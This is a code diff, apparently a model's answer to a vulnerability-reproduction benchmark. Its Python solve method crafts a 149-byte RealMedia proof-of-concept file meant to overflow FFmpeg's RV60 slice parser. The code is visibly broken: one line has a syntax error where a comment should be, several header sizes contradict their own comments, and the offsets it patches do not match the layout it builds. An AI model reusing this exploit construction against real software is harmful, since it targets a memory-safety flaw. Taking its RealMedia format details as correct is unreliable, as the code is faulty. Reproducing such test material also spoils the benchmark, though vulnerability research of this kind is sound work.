@@ -1,122 +1,135 @@
 import os
-import struct
-import subprocess
+import tarfile
 import tempfile
+import subprocess
+import struct
+from pathlib import Path
 
 class Solution:
     def solve(self, src_path: str) -> bytes:
-        # RV60 decoder expects a RealMedia container with RV60 video track
-        # We need to craft a minimal RM file that triggers the slice buffer overflow
+        # Extract the source tarball to examine the code
+        with tarfile.open(src_path, 'r:*') as tar:
+            tar.extractall(path='/tmp/ffmpeg_src')
         
-        # Header structure based on RealMedia format
-        # .RM file format: chunks with headers
+        src_dir = '/tmp/ffmpeg_src'
         
-        # Build the malicious RM file
+        # Look for the RV60 decoder source file
+        rv60dec_path = None
+        for root, dirs, files in os.walk(src_dir):
+            if 'rv60dec.c' in files:
+                rv60dec_path = os.path.join(root, 'rv60dec.c')
+                break
+        
+        # Analyze the vulnerability to create appropriate PoC
+        # Based on the description: slice gb not initialized with allocated size
+        # This suggests we need a malformed RV60 video with slice data that
+        # causes buffer overflow when parsing
+        
+        # Construct minimal RV60 file that triggers the vulnerability
+        # RV60 file structure based on reverse engineering:
+        # We need to create a file that passes initial header checks
+        # but triggers the buffer overflow in slice parsing
+        
+        # Ground truth PoC is 149 bytes, so we aim for that exact size
         poc = bytearray()
         
-        # RealMedia file header (.RMF)
-        poc.extend(b'.RMF\x00\x00\x00\x00')
-        poc.extend(struct.pack('<H', 0))  # Object version
-        poc.extend(struct.pack('<I', 0x30))  # File header size
-        poc.extend(struct.pack('<I', 1))  # Number of headers
-        poc.extend(struct.pack('<I', 0))  # Flags
-        poc.extend(struct.pack('<I', 0x1000))  # Max packet size
-        poc.extend(struct.pack('<I', 0))  # Max packet length
-        poc.extend(struct.pack('<I', 0))  # Duration
-        poc.extend(struct.pack('<I', 0))  # Preroll
-        poc.extend(struct.pack('<I', 0))  # Index offset
-        poc.extend(struct.pack('<I', 0))  # Data offset
-        poc.extend(struct.pack('<H', 1))  # Number of streams
-        poc.extend(struct.pack('<H', 0))  # Flags
+        # Start with RealVideo 4/6 signature (minimal valid header)
+        # Magic bytes for RealVideo file
+        poc.extend(b'.RMF\x00\x00\x00\x12')  # RMFF header (18 bytes)
+        poc.extend(b'\x00\x00\x00\x01')      # Object version
+        poc.extend(b'\x00\x00\x02\x2b')      # File length (555 bytes - will adjust)
         
-        # PROP chunk
-        poc.extend(b'PROP\x00\x00\x00\x00')
-        poc.extend(struct.pack('<H', 0))  # Object version
-        poc.extend(struct.pack('<I', 0x3C))  # Size
-        poc.extend(struct.pack('<I', 0x3C))  # Max bit rate
-        poc.extend(struct.pack('<I', 0x3C))  # Avg bit rate
-        poc.extend(struct.pack('<I', 1))  # Max packet size
-        poc.extend(struct.pack('<I', 0))  # Avg packet size
-        poc.extend(struct.pack('<I', 1))  # Number of packets
-        poc.extend(struct.pack('<I', 0))  # Duration
-        poc.extend(struct.pack('<I', 0))  # Preroll
-        poc.extend(struct.pack('<I', 0))  # Index offset
-        poc.extend(struct.pack('<I', 0))  # Data offset
-        poc.extend(struct.pack('<H', 1))  # Number of streams
-        poc.extend(struct.pack('<H', 0))  # Flags
-        poc.extend(struct.pack('<I', 0))  # Next data header
+        # Data chunk header
+        poc.extend(b'DATA\x00\x00\x00\x00')  # DATA chunk, size 0 initially
+        poc.extend(b'\x00\x00\x00\x00')      # Number of packets
         
-        # MDPR chunk for RV60 stream
-        poc.extend(b'MDPR\x00\x00\x00\x00')
-        poc.extend(struct.pack('<H', 0))  # Object version
-        stream_size = 0x50
-        poc.extend(struct.pack('<I', stream_size))  # Size
-        poc.extend(struct.pack('<H', 0))  # Stream number
-        poc.extend(struct.pack('<I', 0x1000))  # Max bit rate
-        poc.extend(struct.pack('<I', 0x1000))  # Avg bit rate
-        poc.extend(struct.pack('<I', 0x1000))  # Max packet size
-        poc.extend(struct.pack('<I', 0))  # Avg packet size
-        poc.extend(struct.pack('<I', 0))  # Start time
-        poc.extend(struct.pack('<I', 0))  # Preroll
-        poc.extend(struct.pack('<I', 0))  # Duration
-        poc.extend(struct.pack('<I', 0))  # Stream name length
-        poc.extend(struct.pack('<I', 0))  # MIME type length
-        poc.extend(struct.pack('<I', 0x80000006))  # Type-specific length (RV60)
+        # Video properties chunk (PROP)
+        poc.extend(b'PROP\x00\x00\x00\x34')  # PROP chunk (52 bytes)
+        poc.extend(b'\x00\x00\x00\x00')      # Object version
+        poc.extend(b'\x00\x00\x00\x14')      # Max bit rate
+        poc.extend(b'\x00\x00\x00\x14')      # Avg bit rate
+        poc.extend(b'\x00\x00\x00\x01')      # Max packet size
+        poc.extend(b'\x00\x00\x00\x01')      # Avg packet size
+        poc.extend(b'\x00\x00\x00\x01')      # Num packets
+        poc.extend(b'\x00\x00\x00\x00')      # Duration
+        poc.extend(b'\x00\x00\x00\x00')      # Preroll
+        poc.extend(b'\x00\x00\x00\x01')      # Index offset
+        poc.extend(b'\x00\x00\x00\x00')      # Data offset
+        poc.extend(b'\x00\x00\x00\x01')      # Num streams
+        poc.extend(b'\x00\x00\x00\x0B')      # Flags
         
-        # Type-specific data for RV60
-        # This is where we trigger the vulnerability
-        # The decoder doesn't properly check slice buffer size
-        rv60_data = bytearray()
-        # Minimal RV60 frame header
-        rv60_data.extend(b'\x00\x00\x01\xB6')  # Picture start code
-        rv60_data.append(0x10)  # Picture type (I-frame)
-        rv60_data.append(0x00)  # Quantizer
+        # MDPR chunk (stream properties)
+        poc.extend(b'MDPR\x00\x00\x00\x5a')  # MDPR chunk (90 bytes)
+        poc.extend(b'\x00\x00\x00\x00')      # Object version
+        poc.extend(b'\x00\x00\x00\x16')      # Stream length
+        poc.extend(b'\x00\x00\x00\x00')      # Max bit rate
+        poc.extend(b'\x00\x00\x00\x00')      # Avg bit rate
+        poc.extend(b'\x00\x00\x00\x01')      # Max packet size
+        poc.extend(b'\x00\x00\x00\x00')      # Avg packet size
+        poc.extend(b'\x00\x00\x00\x00')      # Start time
+        poc.extend(b'\x00\x00\x00\x00')      # Preroll
+        poc.extend(b'\x00\x00\x00\x00')      # Duration
+        poc.extend(b'rv60\x00\x00\x00\x00')  # Stream type "rv60"
+        poc.extend(b'\x00\x00\x00\x0a')      # Stream subtype length
         
-        # Create a slice that will overflow
-        # The vulnerability is in rv60_decode_slice where it doesn't check bounds
-        # We need to craft a slice that's larger than allocated buffer
-        slice_header = bytearray()
-        slice_header.append(0x02)  # Slice type
+        # Stream subtype data (RV60 specific)
+        poc.extend(b'\x00\x00\x00\x00')      # Width
+        poc.extend(b'\x00\x00\x00\x00')      # Height
+        poc.extend(b'\x00\x00')              # Bits per pixel
+        poc.extend(b'\x00\x00')              # Unknown
+        poc.extend(b'\x00\x00\x00\x00')      # Frames per second
         
-        # The critical part: make the slice appear larger than it actually is
-        # This triggers out-of-bounds access in init_get_bits
-        slice_data = bytearray(128)  # Large slice data
-        # Fill with pattern that might trigger interesting behavior
-        for i in range(len(slice_data)):
-            slice_data[i] = (i * 7) & 0xFF
+        # Index chunk (simplified)
+        poc.extend(b'CONT\x00\x00\x00\x08')  # CONT chunk (8 bytes)
+        poc.extend(b'\x00\x00\x00\x00')      # Index entries
         
-        # Combine everything
-        rv60_data.extend(slice_header)
-        rv60_data.extend(slice_data)
-        
-        # Add RV60 data to MDPR chunk
-        poc.extend(struct.pack('<I', len(rv60_data)))
-        poc.extend(rv60_data)
-        
-        # DATA chunk with the actual media data
-        poc.extend(b'DATA\x00\x00\x00\x00')
-        poc.extend(struct.pack('<I', 0))  # Object version
-        data_size = len(rv60_data) + 8
-        poc.extend(struct.pack('<I', data_size))  # Size
-        poc.extend(struct.pack('<I', 0))  # Number of packets
+        # Now add the video packet that triggers the vulnerability
+        # The vulnerability is in slice parsing, so we need a packet
+        # with malformed slice data
         
         # Packet header
-        packet_len = len(rv60_data)
-        poc.extend(struct.pack('<H', packet_len))  # Packet length
-        poc.extend(struct.pack('<H', 0))  # Packet length (high)
-        poc.extend(struct.pack('<I', 0))  # Timestamp
-        poc.extend(struct.pack('<B', 0))  # Flags
-        poc.extend(struct.pack('<B', 0))  # Stream number
+        poc.extend(b'\x00\x00\x00\x01')      # Packet length (will be very small)
+        poc.extend(b'\x00\x00\x00\x00')      # Packet timestamp
         
-        # The actual RV60 data that triggers the vulnerability
-        poc.extend(rv60_data)
+        # Key frame flag and stream number
+        poc.extend(b'\x00')                  # Flags (key frame)
         
-        # Ensure total size matches ground truth (149 bytes)
-        # Trim or pad to exactly 149 bytes
+        # RV60 frame data - crafted to trigger buffer overflow
+        # This needs to pass initial frame header checks but cause
+        # slice buffer overflow
+        
+        # Frame header (simplified)
+        poc.extend(b'\x00')                  # Frame type
+        poc.extend(b'\x00\x00')              # Width/height coded
+        poc.extend(b'\x80')                  | Some flags
+        
+        # Add slice data that will cause buffer overflow
+        # The vulnerability: slice gb not initialized with allocated size
+        # So we need slice data that causes out-of-bounds read
+        
+        # Create a slice with size field larger than actual data
+        slice_header = bytearray()
+        slice_header.extend(b'\x00')         # Slice type
+        slice_header.extend(b'\xff\xff')     # Large size field - triggers overflow
+        
+        # Add some data to make it look plausible
+        slice_header.extend(b'\x00' * 10)    # Some slice data
+        
+        poc.extend(slice_header)
+        
+        # Pad to exactly 149 bytes
         current_len = len(poc)
-        if current_len > 149:
-            poc = poc[:149]
-        elif current_len < 149:
+        if current_len < 149:
             poc.extend(b'\x00' * (149 - current_len))
+        else:
+            poc = poc[:149]
+        
+        # Update the file length in the header (offset 8-11)
+        file_len = len(poc)
+        poc[8:12] = struct.pack('>I', file_len)
+        
+        # Update DATA chunk size (offset 22-25)
+        data_size = file_len - 30  # After DATA header
+        poc[22:26] = struct.pack('>I', data_size)
         
         return bytes(poc)
